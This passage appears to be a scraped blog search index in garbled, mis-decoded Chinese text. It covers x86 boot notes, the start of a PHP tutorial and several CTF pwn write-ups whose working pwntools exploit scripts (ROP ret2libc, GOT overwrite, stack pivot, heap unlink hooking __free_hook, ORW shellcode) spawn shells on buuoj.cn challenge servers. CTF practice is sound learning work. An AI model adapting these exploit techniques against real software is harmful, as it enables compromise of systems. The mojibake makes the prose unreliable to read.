å…³æ³¨ipæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼Œè¿™éƒ¨åˆ†æ˜¾ç„¶ç”±ç¡¬ä»¶çš„è®¾è®¡è€…æ¥å†³å®š x86PC åˆšå¼€æœºçš„æ—¶å€™cpuå¤„äºå®æ¨¡å¼ï¼ŒæŒ‰ç…§å®æ¨¡å¼æ¥å¯»å€ï¼Œcså·¦ç§»å››ä½+ip å¼€æœºæ—¶ï¼ŒCS = 0xFFFF IP = 0x0000 å¯»å€åˆ°0xFFFF0ï¼Œä¸ºROM BIOSæ˜ å°„åŒºï¼ˆBIOS = basic input output systemï¼‰ æ£€æŸ¥RAMï¼Œé”®ç›˜ï¼Œæ˜¾ç¤ºå™¨å’Œè½¯ç¡¬ç£ç›˜ç­‰ å°†0ç£é“0æ‰‡åŒºè¯»å…¥0x7c00å¤„ è®¾ç½®CS = 0x07c0 IP=0x0000 0x7c00å¤„å­˜æ”¾çš„ä»£ç å°±æ˜¯ä»å¼•å¯¼æ‰‡åŒºè¯»å…¥çš„é‚£512ä¸ªå­—èŠ‚ bootsec.s ç¬¬ä¸€éƒ¨åˆ†ï¼šå°†è‡ªèº«ï¼Œå³bootsecç”±æ®µ0x07c0ç§»åŠ¨åˆ°æ®µ0x9000ï¼Œå…±è®¡256ä¸ªå­—ï¼Œç„¶åè·³è½¬åˆ°goæ ‡å·å¤„ï¼Œå³ä¸‹ä¸€æ¡æŒ‡ä»¤ç»§ç»­æ‰§è¡Œ ç¬¬äºŒéƒ¨åˆ†ï¼šåˆ©ç”¨BIOSä¸­æ–­INT 0x13å°†setupæ¨¡å—ä»ç£ç›˜ç¬¬äºŒä¸ªæ‰‡åŒºå¼€å§‹è¯»åˆ°0x90200å¤„ï¼Œå…±è¯»å››ä¸ªæ‰‡åŒº ç¬¬ä¸‰éƒ¨åˆ†ï¼šsetupæ¨¡å—è¯»å…¥å æ˜¾ç¤ºå­—ç¬¦ä¿¡æ¯ æ“ä½œç³»ç»Ÿå¯åŠ¨ setup.s ç¬¬ä¸€éƒ¨åˆ†ï¼šç§»åŠ¨systemæ¨¡å— ç¬¬äºŒéƒ¨åˆ†ï¼šå¯åŠ¨ä¿æŠ¤æ¨¡å¼ gdtï¼šglobal description table ä¿æŠ¤æ¨¡å¼ä¸‹çš„å¯»å€æ¨¡å¼ï¼šæ ¹æ®csæŸ¥è¡¨+ip å°†systemç§»åŠ¨åˆ°0x0000å¤„ ç¬¬ä¸‰éƒ¨åˆ†ï¼šè·³è½¬åˆ°systemå»æ‰§è¡Œ ","link":"https://l3mon629.github.io/post/cao-zuo-xi-tong/"},{"title":"[BJDCTF 2nd]pwné¢˜ç›®å…¨è§£(æ›´æ–°ä¸­)","content":"[BJDCTF 2nd]rci å¾ˆä¸é”™çš„é¢˜ç›® ä¸éœ€è¦å†™expï¼Œç›´æ¥ncåšå°±è¡Œäº† é€†å‘åˆ†æ mainå‡½æ•°ï¼Œæœ‰ä¸€ä¸ªinitå‡½æ•°ï¼Œæˆ‘ä»¬è¿›å»çœ‹çœ‹ åœ¨initå‡½æ•°é‡Œé¢ï¼Œç¨‹åºé¦–å…ˆåˆ°/tmpæ–‡ä»¶å¤¹ä¸‹é¢æ–°å»ºäº†è‹¥å¹²æ–‡ä»¶å¤¹ï¼Œç„¶åéšæœºé€‰ä¸€ä¸ªæ–‡ä»¶å¤¹è¿›å…¥ï¼Œè®°ä¸ºâ€œè—æœ‰imaginâ€çš„æ–‡ä»¶å¤¹ï¼Œç„¶åæç¤ºæˆ‘ä»¬è·å¾—é“å…·ls åœ¨ä¸‹é¢æˆ‘ä»¬å¯ä»¥å‘commandå†™å…¥ä¸œè¥¿ï¼Œç„¶åsystem(command)ï¼Œä½†æ˜¯ä¹‹å‰æœ‰ä¸€ä¸ªæ£€æŸ¥check1 æˆ‘ä»¬åªèƒ½è¾“å…¥a-zå’ŒA-Zå’Œâ€œ/â€ â€œ â€ â€œ-â€ä¸‰ä¸ªç‰¹æ®Šå­—ç¬¦ æ¥ä¸‹æ¥æ˜¯ç‰¹æ®Šçš„çŸ¥è¯†ç‚¹äº†ï¼Œé¢˜ç›®è€ƒæˆ‘ä»¬å…³äºlinuxçš„ç†Ÿæ‚‰åº¦ inode ç†è§£inodeï¼Œè¦ä»æ–‡ä»¶å‚¨å­˜è¯´èµ·ã€‚ æ–‡ä»¶å­˜å‚¨åœ¨ç¡¬ç›˜ä¸Šï¼Œç¡¬ç›˜çš„æœ€å°å­˜å‚¨å•ä½å«åšâ€œæ‰‡åŒºâ€ï¼ˆSectorï¼‰ã€‚æ¯ä¸ªæ‰‡åŒºå‚¨å­˜512å­—èŠ‚ï¼ˆç›¸å½“äº0.5KBï¼‰ã€‚ æ“ä½œç³»ç»Ÿè¯»å–ç¡¬ç›˜çš„æ—¶å€™ï¼Œä¸ä¼šä¸€ä¸ªä¸ªæ‰‡åŒºçš„è¯»å–ï¼Œè¿™æ ·æ•ˆç‡å¤ªä½ï¼Œè€Œæ˜¯ä¸€æ¬¡æ€§è¿ç»­è¯»å–å¤šä¸ªæ‰‡åŒºï¼Œå³ä¸€æ¬¡æ€§è¯»å–ä¸€ä¸ªâ€œå—â€ï¼ˆblockï¼‰ã€‚è¿™ç§ç”±å¤šä¸ªæ‰‡åŒºç»„æˆçš„â€œå—â€ï¼Œæ˜¯æ–‡ä»¶å­˜å–çš„æœ€å°å•ä½ã€‚â€œå—â€çš„å¤§å°ï¼Œæœ€å¸¸è§çš„æ˜¯4KBï¼Œå³è¿ç»­å…«ä¸ªsectorç»„æˆä¸€ä¸ªblockã€‚ æ–‡ä»¶æ•°æ®éƒ½å‚¨å­˜åœ¨â€œå—â€ä¸­ï¼Œé‚£ä¹ˆå¾ˆæ˜¾ç„¶ï¼Œæˆ‘ä»¬è¿˜å¿…é¡»æ‰¾åˆ°ä¸€ä¸ªåœ°æ–¹å‚¨å­˜æ–‡ä»¶çš„â€œå…ƒä¿¡æ¯â€ï¼Œæ¯”å¦‚æ–‡ä»¶çš„åˆ›å»ºè€…ã€æ–‡ä»¶çš„åˆ›å»ºæ—¥æœŸã€æ–‡ä»¶çš„å¤§å°ç­‰ç­‰ã€‚è¿™ç§å‚¨å­˜æ–‡ä»¶å…ƒä¿¡æ¯çš„åŒºåŸŸå°±å«åšinodeï¼Œä¸­æ–‡è¯‘åä¸º&quot;ç´¢å¼•èŠ‚ç‚¹&quot;ã€‚ æ¯ä¸€ä¸ªæ–‡ä»¶éƒ½æœ‰å¯¹åº”çš„inodeï¼Œé‡Œé¢åŒ…å«äº†ä¸è¯¥æ–‡ä»¶æœ‰å…³çš„ä¸€äº›ä¿¡æ¯ã€‚ ä¸‡ç‰©çš†æ–‡ä»¶ï¼Œæ–‡ä»¶å¤¹ä¹Ÿæœ‰å…¶å¯¹åº”çš„inodeå·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ls -iæŸ¥çœ‹inodeå·ç  æˆ‘ä»¬å¼€ä¸¤ä¸ªshellï¼Œç„¶åä¸€ä¸ªè¾“å…¥ ls -ali æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„inodeï¼Œç„¶åå†å¦å¤–ä¸€ä¸ªè¾“å…¥ls -ali /tmpï¼Œå°±å¯ä»¥æŸ¥çœ‹tmpæ–‡ä»¶å¤¹ä¸‹çš„inodeå·ï¼Œå¦‚ä¸‹å›¾ ç„¶åä¸¤ä¸ªinodeå·ç›¸åŒçš„å°±æ˜¯æˆ‘ä»¬å½“å‰æ‰€åœ¨ç›®å½• å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è·å¾—æ®‹ç¼ºçš„shell æœ‰ä¸ªcheck2è¿›è¡Œæ£€æŸ¥ ä¸¤ç§ç»•è¿‡æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯ç”¨æ‹¼æ¥ç¬¦&quot;``&quot;,å¯ä»¥æ‹¿shell ç¬¬äºŒä¸ªæ˜¯ç”¨$0æ¥ç»•è¿‡ diff æŒºæœ‰æ–°æ„çš„ä¸€ä¸ªé¢˜ sshç™»é™†æœåŠ¡å™¨ ç„¶åæç¤ºæˆ‘ä»¬è¿™ä¸ªç¨‹åºæ€ä¹ˆç”¨ï¼Œæ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶å•¥çš„ï¼Œæˆ‘ä»¬ç”¨scpç»™å®•ä¸‹æ¥ scp -P 29477 ctf@node3.buuoj.cn:/home/ctf/diff /ctf/work/pwn-enclo/ ç„¶ååˆ†æä¸€ä¸‹ï¼Œä¿æŠ¤å…¨å…³ï¼Œä¸»è¦é€»è¾‘å°±æ˜¯æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹ ç‚¹è¿›å»compareå‡½æ•° å¯ä»¥å‘ç°æœ‰ä¸ªæ ˆæº¢å‡º ç„¶åprintå‡½æ•°å¯ä»¥è¾“å‡ºæ–‡ä»¶ä¸€çš„å†…å®¹ï¼Œä½†æ˜¯å‰ææ˜¯file1=file2ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½èµ°æ­£å¸¸æµç¨‹ï¼Œç›´æ¥æ ˆæº¢å‡ºç»™åŠ«æŒåˆ°è¾“å‡ºfile1çš„åœ°æ–¹ payload: babyrop from LibcSearcher import * from pwn import * local = 0 binary = &quot;bjdctf_2020_babyrop&quot; if local == 1: p = process(binary) else: p = remote(&quot;node3.buuoj.cn&quot;,28510) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] elf = ELF(binary) # puts(puts@got) puts = elf.got['puts'] puts_plt = elf.plt['puts'] main = elf.sym['main'] offset = 0x28 pop_rdi_ret = 0x0000000000400733 payload = offset * 'a' + p64(pop_rdi_ret) + p64(puts) + p64(puts_plt) + p64(main) # let puts@plt puts puts@got p.recvuntil('Pull up your sword and tell me u story!') p.send(payload) puts_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) libc = LibcSearcher('puts',puts_addr) libc_base = puts_addr - libc.dump('puts') print &quot;[*] libc_base:&quot;,hex(libc_base) system_addr = libc_base + libc.dump('system') binsh_addr = libc_base + libc.dump('str_bin_sh') payload = offset * 'a' + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(0xdeadbeef) p.recvuntil('Pull up your sword and tell me u story!') p.send(payload) #gdb.attach(p) p.interactive() test è¿‡æ»¤äº†flagï¼Œå¹¶ä¸”flagæ²¡æœ‰è¯»æƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½å€Ÿç”¨å®ƒçš„testç¨‹åºæ¥æ‰“ï¼Œæœ‰odå‘½ä»¤å¯ä»¥ç”¨ï¼Œç›´æ¥od * ","link":"https://l3mon629.github.io/post/bjdctf-2ndpwn-ti-mu-quan-jie/"},{"title":"buu-pwn(2)","content":"picoctf_2018_got_shell æœ‰æ„æ€çš„é¢˜ç›®ï¼Œä¹Ÿä¸éš¾ï¼Œç†æ¸…æ¥šé€»è¾‘å°±èƒ½å‡º mainå‡½æ•°ï¼Œé€»è¾‘æ˜¯è¾“å…¥ä¸€ä¸ªåœ°å€v3å­˜å…¥s ç„¶åè¾“å…¥v4ï¼Œå°†v3å’Œv4éƒ½è¾“å…¥s ç„¶åv3çš„å€¼è¢«èµ‹å€¼ç»™v4çš„åœ°å€ ç¨‹åºæœ¬èº«æœ‰åé—¨ æˆ‘ä»¬åªéœ€è¦æŠŠv3èµ‹å€¼ç»™puts@gotï¼Œç„¶åæŠŠv4çš„åœ°å€èµ‹å€¼ç»™åé—¨åœ°å€ ç„¶åè°ƒç”¨putsçš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨åé—¨ï¼Œç„¶åæ‹¿åˆ°shell exp from pwn import * local = 0 if local == 1: p = process('./PicoCTF_2018_got-shell') else: p = remote('node3.buuoj.cn',28761) elf = ELF('./PicoCTF_2018_got-shell') #libc = ELF('./libc.so.6') def dbg(): context.log_level = 'debug' p.recvuntil('I\\'ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?\\n') payload = hex(elf.got['puts']) p.sendline(payload) backdoor = int(0x0804854B) payload = hex(backdoor) p.sendline(payload) p.interactive() ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡å¼€canaryï¼Œæœ¬æ¥åº”è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥åšï¼Œä½†æ˜¯ğŸ‘´ç›´æ¥æ ˆæº¢å‡º exp: from pwn import * local = 0 binary = 'mrctf2020_easy_equation' if local == 1: p = process(binary) else: p = remote('node3.buuoj.cn',27287) offset = 1 + 0x8 backdoor = 0x4006D0 payload = offset * b'A' + p64(backdoor) p.sendline(payload) p.interactive() wustctf2020_number_game intå‹çš„èŒƒå›´åœ¨[-2147483648,2147483647]ï¼Œè¾“å…¥è´Ÿè¾¹ç•Œå°±èƒ½ç»•è¿‡åˆ¤æ–­ [Black Watch å…¥ç¾¤é¢˜]PWN vulå‡½æ•° å¯ä»¥æº¢å‡ºä¸¤ä¸ªå­—é•¿ï¼Œè€Œä¸”æˆ‘ä»¬å¯ä»¥æ§åˆ¶bssæ®µçš„0x200ä¸ªå­—èŠ‚ ç›´æ¥æ ˆè¿ç§»ï¼Œåˆ©ç”¨leaveæŒ‡ä»¤æ‰“bss exp: from pwn import * from LibcSearcher import * binary = './spwn' #libc = ELF('./libc.so.6') local = 0 if local == 1: p = process(binary) else: p = remote('node3.buuoj.cn',25304) elf = ELF(binary) def dbg(): context.log_level = 'debug' #dbg() write_plt = elf.plt['write'] main_addr = elf.sym['main'] read_got = elf.got['read'] pop_ebp = 0 payload = p32(pop_ebp) + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(0x4) # mov esp,ebp; pop ebp; pop eip; p.sendafter('What is your name?',payload) payload = 0x18 * 'a' + p32(0x0804A300) + p32(0x08048511) p.sendafter('What do you want to say?',payload) read_addr = u32(p.recv(4)) print hex(read_addr) ''' libc_base = read_addr - libc.sym['read'] system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + libc.search('/bin/sh').next() ''' libc = LibcSearcher('read',read_addr) libc_base = read_addr - libc.dump('read') system_addr = libc_base + libc.dump('system') binsh_addr = libc_base + libc.dump('str_bin_sh') payload = p32(pop_ebp) + p32(system_addr) + p32(system_addr) + p32(binsh_addr) p.sendafter('What is your name?',payload) payload = 0x18 * 'a' + p32(0x0804A300) + p32(0x08048511) #addr:level p.sendafter('What do you want to say?',payload) p.interactive() wustctf2020_name_your_dog æŒºå¥½ç©çš„ä¸€ä¸ªé¢˜ç›®ï¼Œä¸€å¼€å§‹è°ƒè¯•æƒ³æ‰“printfå‘ç°å¤±è´¥äº† åæ¥ç›´æ¥æ‰“__isoc99_scanf vulå‡½æ•° å¯ä»¥å¯¹æˆ‘ä»¬çš„dogè¿›è¡Œå‘½åï¼Œè¿™ä¸ªé€»è¾‘å°±æ˜¯ä»¥ä¸€ä¸ªbssæ®µä¸ºæ•°è½´çš„ä¸­å¿ƒï¼Œå¯ä»¥å‘å‰å‘åè¿›è¡Œä»»æ„åœ°å€å†™7ä¸ªå­—èŠ‚ nameå‡½æ•° ç›´æ¥æ”¹æ‰__isoc99_scanfçš„gotè¡¨å³å¯ from pwn import * local = 0 if local == 1: p = process('./wustctf2020_name_your_dog') else: p = remote(&quot;node3.buuoj.cn&quot;,26562) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] elf = ELF('./wustctf2020_name_your_dog') #offset_printf_dog = -10 #(scanf@got - 0x804A060) = -56 payload0 = -7 p.sendlineafter('&gt;',str(payload0)) backdoor = 0x080485CB payload1 = p32(backdoor) p.sendlineafter('Give your name plz:',payload1) p.interactive() bjdctf_2020_YDSneedGrirlfriend è·Ÿpwnableçš„noteä¸€æ‘¸ä¸€æ ·ï¼Œå°±æ˜¯æŠŠnoteæ•°é‡æ”¹æˆäº†æ¨å¸ˆå‚…çš„å¥³æœ‹å‹æ•°é‡ã€‚ ä¸‰åˆ†é’Ÿå†™å¥½expä¸€æŠŠğŸ”’ from pwn import * local = 0 if local == 1: p = process('./bjdctf_2020_YDSneedGrirlfriend') else: p = remote(&quot;node3.buuoj.cn&quot;,29951) def dbg(): context.log_level = 'debug' def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Her name size is :',str(size)) p.sendafter('Her name is :',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def free(index): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) context.terminal = ['tmux','splitw','-h'] elf = ELF('./bjdctf_2020_YDSneedGrirlfriend') backdoor = 0x400B9C add(0x10,'aaaaaaaa') #chunk0 add(0x20,'aaaaaaaa') #chunk1 free(0) free(1) add(0x10,p64(backdoor)) show(0) #gdb.attach(p) p.interactive() pwnable_orw é¢˜ç›®ç›´æ¥bsså¯æ‰§è¡Œï¼Œè®©æˆ‘ä»¬ä¸¢shellcode ä½†æ˜¯åŠ äº†ä¸ªæ²™ç®±ï¼Œåªèƒ½ç”¨orwå»è¯» çœŸä¸æˆ³çœŸä¸æˆ³ï¼Œåˆä»pwnkiè€å¸ˆé‚£å„¿å­¦åˆ°äº†shellcraftçš„æ–°å§¿åŠ¿ exp: from pwn import * local = 1 binary = &quot;./orw&quot; if local == 0: p = process(binary) else: p = remote(&quot;node3.buuoj.cn&quot;,26316) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] context(arch = 'i386', os = 'linux') bss = 0x0804A060 + 0x100 shellcode = shellcraft.open('/flag') # /* open(file='flag', oflag=0, mode=0) */ # /* push 'flag\\x00' */ # push 1 # dec byte ptr [esp] # push 0x67616c66 # mov ebx, esp # xor ecx, ecx # xor edx, edx # /* call open() */ # push SYS_open /* 5 */ # pop eax # int 0x80 #shellcode += shellcraft.read('eax',bss,0x100) shellcode += shellcraft.read('eax','esp',0x100) # /* read(fd='eax', buf='esp', nbytes=256) */ # mov ebx, eax # mov ecx, esp # xor edx, edx # mov dh, 0x100 &gt;&gt; 8 # /* call read() */ # push SYS_read /* 3 */ # pop eax # int 0x80 #shellcode += shellcraft.write(1,bss,0x100) shellcode += shellcraft.write(1,'esp',0x100) # /* write(fd=1, buf='esp', n=256) */ # push 1 # pop ebx # mov ecx, esp # xor edx, edx # mov dh, 0x100 &gt;&gt; 8 # /* call write() */ # push SYS_write /* 4 */ # pop eax # int 0x80 shellcode = asm(shellcode) p.sendafter('Give my your shellcode:',shellcode) p.interactive() wustctf2020_name_your_cat è·Ÿdogé‚£ä¸ªå·®ä¸å¤šï¼Œä¸è¿‡è¿™æ¬¡ä¼ å…¥çš„æ˜¯æ ˆçš„åœ°å€ï¼Œå¾ˆè‡ªç„¶æƒ³åˆ°æ”¹å†™retçš„åœ°å€ ä½†æ˜¯ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä¿®æ”¹array+0x38å¤„çš„åœ°å€ï¼Œä½†æ˜¯åæ¥æ‰æ„è¯†åˆ°å‡½æ•°è°ƒç”¨ï¼Œæ ˆæ¡¢è¿ç§»äº†ä¸€ä¸‹ï¼Œæ‰€ä»¥åŠ¨æ€è°ƒè¯•ä¸€ä¸‹ æœ‰åé—¨ï¼Œä¸€æŠŠæ¢­ exp from pwn import * local = 0 binary = &quot;./wustctf2020_name_your_cat&quot; if local == 1: p = process(binary) else: p = remote(&quot;node3.buuoj.cn&quot;,26919) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] def add(index,content): p.sendlineafter('&gt;',str(index)) p.sendlineafter('Give your name plz: ',content) dbg() backdoor = 0x080485D4 add(-5,p32(backdoor)) #gdb.attach(p) p.interactive() ","link":"https://l3mon629.github.io/post/buu-pwn2/"},{"title":"axb_2019_heap","content":"å‘ç°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é¢˜ç›®ï¼Œå­¦åˆ°äº†ä¸€äº›ä¸œè¥¿ï¼Œç‰¹æ­¤è®°å½•ä¸€ä¸‹ é€†å‘ mainå‡½æ•°ï¼š åœ¨format_stringé‡Œé¢æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ addå‡½æ•°ï¼š å¾ˆé•¿ï¼Œå¤§ä½“æ„æ€å°±æ˜¯bssæ®µä¸Šæœ‰ä¸€ä¸ªkeyï¼Œå¦‚æœkey == 43ï¼Œå°±å¯ä»¥ç”³è¯·fastbinå¤§å°çš„chunkï¼Œå¦åˆ™ä¸å¯ä»¥ get_inputé‡Œé¢å­˜åœ¨off-by-oneæ¼æ´ï¼Œåˆ«çš„å‡½æ•°å°±ä¸çœ‹äº†ï¼ŒèŠ‚çœæ—¶é—´ æ€è·¯ è¿™ä¸ªé¢˜ç›®åœ¨bssä¸Šæ˜¯æœ‰heaparrayçš„ï¼Œä½†æ˜¯ä¿æŠ¤å…¨å¼€ï¼Œæœ‰ä¸ªformat stringæ¼æ´ æ€è·¯å°±å‡ºæ¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„æ¼ç›¸å…³åœ°å€ï¼Œç„¶åå®æ–½unlinkæ”»å‡» æˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹ï¼Œç›´æ¥å®šä½åˆ°printfçš„ä½ç½®å•æ­¥è°ƒè¯• æ³¨æ„ï¼Œè°ƒè¯•æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æ—¶å€™ä¸€å®šè¦è¿›å…¥åˆ°è¾“å…¥ç‚¹ä¹‹å‰æ‰èƒ½ç¡®å®šæ ˆä¸Šçš„ä½ç½® tipsï¼šåœ¨pwndbgé‡Œé¢æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å‘½ä»¤fmtargæ¥ç¡®å®šæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å‡ ä¸ªå‚æ•° fmtarg 0x7ffdb76453e8 main+28çš„åœ°æ–¹å‘ç°æ˜¯ç¬¬åä¸€ä¸ªå‚æ•°ï¼Œ__libc_start_main+20çš„åœ°æ–¹å‘ç°æ˜¯ç¬¬åäº”ä¸ªå‚æ•° ä½†æ˜¯æ³¨æ„ï¼Œæˆ‘ä»¬åœ¨æ‰“æ ¼å¼åŒ–çš„æ—¶å€™ï¼Œ%11påªæ˜¯å–æ ˆçš„åœ°å€ï¼Œè¦æƒ³å–æ ˆåœ°å€é‡Œé¢å­˜çš„å€¼è¦ç”¨$p åˆ©ç”¨main+28å¯ä»¥æ³„æ¼å‡ºheaparrayçš„åœ°å€ï¼Œå…·ä½“åšæ³•å¦‚ä¸‹ .text:000000000000116A .text:000000000000116A ; int __cdecl main(int argc, const char **argv, const char **envp) .text:000000000000116A public main .text:000000000000116A main proc near ; DATA XREF: _start+1Dâ†‘o .text:000000000000116A å¯ä»¥çœ‹åˆ°åœ¨å¼€å¯pieçš„æƒ…å†µä¸‹mainçš„ç›¸å¯¹åŠ è½½ä½ç½®åœ¨0x116Aå¤„ .bss:0000000000202060 public note .bss:0000000000202060 note db ? ; ; DATA XREF: add_note+DAâ†‘o .bss:0000000000202060 ; add_note+F4â†‘o ... heaparrayä½äº0x202060å¤„ï¼Œæ‰€ä»¥heaparrayåœ¨è¢«åŠ è½½è¿›å†…å­˜çš„åœ°å€å°±ç­‰äº(main+28)-28-0x116A+0x202060çš„åœ°å€ åˆ©ç”¨__libc_start_mainæ¥æ³„æ¼libcçš„åœ°å€ æ€è·¯å°±æ˜¯ç”³è¯·ä¸‰ä¸ªchunkï¼Œç„¶ååˆ©ç”¨off-by-oneæº¢å‡ºä¸€ä¸ªå­—èŠ‚unlinkåˆ°heaparrayï¼Œç„¶åæ”¹å†™__free_hookä¸ºsystem ä¸ºä»€ä¹ˆä¸æ”¹å†™__malloc_hookå‘¢ï¼Ÿï¼Ÿå› ä¸ºç¨‹åºå†…éƒ¨å­˜åœ¨æ£€æŸ¥ï¼Œå¦‚æœæ”¹å†™mallocç›¸å…³çš„å‡½æ•°ä¼šæŠ¥å‡º&quot;no hacker&quot;ä¹‹ç±»çš„å­—ç¬¦ä¸² ä¸ºä»€ä¹ˆä¸æ”¹å†™freeå‘¢ï¼Ÿï¼Ÿå› ä¸ºè°ƒè¯•å‘ç°ä¼šcrashæ‰ tipsï¼šunlinkçš„æ—¶å€™æ³¨æ„ chunk0 chunk1 chunk2 æˆ‘ä»¬é€šå¸¸æ˜¯å…ˆæ„é€ fakechunkï¼Œç„¶åfree(1)ï¼Œä½†æ˜¯æˆ‘ä»¬ä¼ªé€ çš„fdå’Œbkæ³¨æ„æ˜¯heaparray[0] - 0x18å’Œ0x10çš„ä½ç½® æœ¬åœ°èƒ½æ‰“é€šï¼Œè¿œç¨‹ä¸€ç›´æŠ¥timeoutçš„é”™è¯¯ï¼Œç”¨åˆ«äººçš„è„šæœ¬ä¹Ÿè¿™æ ·ï¼Œæ„äºº exp from pwn import * local = 0 if local == 1: p = process('./axb_2019_heap') else: p = remote('node3.buuoj.cn',28566) elf = ELF('./axb_2019_heap') libc = ELF('./libc.so.6') def dbg(): context.log_level = 'debug' def fmt(name): p.recvuntil('Enter your name:') p.sendline(name) def add(index,size,content): p.sendlineafter('&gt;&gt; ','1') p.sendlineafter('Enter the index you want to create (0-10):',str(index)) p.sendlineafter('Enter a size:',str(size)) p.sendlineafter('Enter the content:',content) def free(index): p.sendlineafter('&gt;&gt; ','2') p.sendlineafter('Enter an index:',str(index)) def edit(index,content): p.sendlineafter('&gt;&gt; ','4') p.sendlineafter('Enter an index:',str(index)) p.sendafter('Enter the content:',content) #dbg() print(&quot;======= step 1 : by use fmtstr leak address libc + bss =======&quot;) fmt('%11$p%15$p') p.recvuntil('Hello,') main = int(p.recv(15),16) - 28 __libc_start_main = int(p.recv(15),16) - 240 print(&quot;main ---&gt; &quot; + hex(main)) print(&quot;__libc_start_main ----&gt; &quot; + hex(__libc_start_main)) heaparray = main - 0x116A + 0x202060 print(&quot;heaparray in bss(DATA) ----&gt; &quot; + hex(heaparray)) libc_base = __libc_start_main - libc.sym['__libc_start_main'] print(&quot;libc base ----&gt;&quot; + hex(libc_base)) add(0,0x98,'A') #chunk0 add(1,0xa0,'B') #chunk1 add(2,0x90,'/bin/sh\\x00') #chunk2 print(&quot;======== step 2: unlink =========&quot;) fd = heaparray - 0x18 bk = heaparray - 0x10 chunk0 = p64(0) + p64(0x91) + p64(fd) + p64(bk) +p64(0) * 14 + p64(0x90) + p64(0xb0) edit(0,chunk0) free(1) print(&quot;======= step 3: attack __free_hook ======&quot;) free = libc_base + libc.symbols['__free_hook'] system = libc_base + libc.symbols['system'] payload = p64(0) * 3 + p64(free) + p64(0x8) + b'\\n' print(&quot;è¿™é‡Œå†™å…¥8æ˜¯å› ä¸ºæˆ‘ä»¬è¦åœ¨bssä¸Šä¼ªé€ chunksizeï¼Œæˆ‘ä»¬éœ€è¦å†™å…¥8å­—èŠ‚çš„payloadï¼Œå³ä¸‹æ–‡çš„p64(system)&quot;) edit(0,payload) payload = p64(system) print(hex(system)) #dbg() edit(0,payload) p.sendline('2') p.sendline('2') p.interactive() ","link":"https://l3mon629.github.io/post/axb_2019_heap/"},{"title":"PHPé¢å‘å¯¹è±¡å­¦ä¹ ","content":"é¢å‘å¯¹è±¡åŸºç¡€ é¢å‘å¯¹è±¡çš„å…³é”®å­—è¯´æ˜ é¢å‘å¯¹è±¡å…³é”®å­—ï¼šåŸºäºé¢å‘å¯¹è±¡å¼€å‘æ—¶ï¼Œæ‰€ç”¨åˆ°çš„ä¸€äº›å…³é”®å­—ï¼Œç”¨æ¥è¡¨æ˜ä¸€äº›ç»“æ„å’Œç±»å‹ ç±»ï¼šå®šä¹‰é¢å‘å¯¹è±¡ä¸»ä½“çš„æœ€å¤–å±‚ç»“æ„ï¼ŒåŒ…è£¹ä¸»ä½“çš„æ•°æ®å’ŒåŠŸèƒ½ï¼Œå…±æ€§äº‹ç‰©çš„ä»£è¡¨ å¯¹è±¡ï¼šæ˜¯æŸç±»äº‹ç‰©çš„å…·ä½“ä»£è¡¨ï¼Œæ˜¯å®é™…æ•°æ®å’ŒåŠŸèƒ½æ“ä½œçš„å…·ä½“å•å…ƒï¼Œä¹Ÿè¢«ç§°ä¹‹ä¸ºå®ä¾‹ å®ä¾‹åŒ–ï¼šnewï¼Œä»ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µå¾—åˆ°ç¬¦åˆæŠ½è±¡æ¦‚å¿µçš„å…·ä½“å®ä¾‹çš„è¿‡ç¨‹ ç±»æˆå‘˜ï¼šmemberï¼ŒæŒ‡ç±»classä¸­çš„æ‰€æœ‰å†…å®¹ï¼Œç±»æˆå‘˜æœ‰ä¸‰ç§ å±æ€§ï¼šåœ¨classä¸­åˆ›å»ºçš„å˜é‡ æ–¹æ³•ï¼šclassç»“æ„ä¸­åˆ›å»ºçš„å‡½æ•° ç±»å¸¸é‡ï¼šconstï¼Œåœ¨classä¸­åˆ›å»ºçš„å¸¸é‡ é¢å‘å¯¹è±¡ç®€å•æŠ€æœ¯å®ç° class å£°å ç±» ç±»åï¼šé©¼å³°å‘½å å¤§æ‹¬å·ï¼šåªæœ‰åœ¨å¤§æ‹¬å·é‡Œé¢çš„ä¸œè¥¿æ‰æ˜¯ç±»æˆå‘˜ï¼Œå¤§æ‹¬å·é‡Œé¢çš„å¤§æ‹¬å·ä¸ç®— class name{ } å®ä¾‹åŒ–ï¼šäº§ç”Ÿå¯¹è±¡ new ç±»å; new ç±»å(); #è¾ƒå¤š å¯¹è±¡ï¼šä¸€èˆ¬ç”¨å˜é‡ä¿å­˜ $object = new classname(); æ­¥éª¤ï¼š1ï¼Œæ 